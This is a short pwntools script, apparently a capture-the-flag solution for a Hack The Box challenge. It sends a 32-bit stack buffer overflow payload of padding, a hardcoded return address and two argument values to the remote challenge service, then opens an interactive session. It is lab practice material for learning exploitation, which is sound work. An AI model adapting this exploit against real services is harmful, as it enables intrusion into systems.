from pwn import *


p = remote('docker.hackthebox.eu',31233)

padd = 'a' * 188
flag_add = p32(0x080491e2)
param1 = p32(0xdeadbeef)
param2 = p32(0xc0ded00d)
payload = ''
payload += padd
payload += flag_add
payload += 'AAAA'
payload += param1
payload += param2 

p.recvline()
p.sendline(payload)
p.interactive()